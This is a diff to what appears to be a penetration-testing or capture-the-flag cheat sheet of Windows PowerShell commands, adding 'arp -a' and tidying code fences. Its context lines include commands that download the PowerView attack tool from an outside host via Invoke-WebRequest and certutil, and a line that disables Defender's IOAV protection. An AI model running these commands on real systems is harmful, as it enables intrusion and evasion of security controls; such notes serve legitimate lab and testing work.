@@ -1,12 +1,3 @@
-Who Am I?
-```powershell
-# Check Groups
-whoami /groups
-
-# Check Privileges
-whoami /priv
-```
-
 Download Files
 ```Powershell
 Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1
@@ -17,7 +8,7 @@ certutil.exe -urlcache -split -f http://<ip>/file file_save
 ```
 
 Get Processes
-```
+```powershell
 Get-Process | Format-Table -Property Name, Id, CPU, WorkingSet -AutoSize
 
 Get-Process -Name "notepad"
@@ -35,6 +26,8 @@ Set-MpPreference -DisableIOAVProtection $true
 List Network Connections
 ```powershell
 netstat -aon
+
+arp -a
 ```
 
 Shortcuts
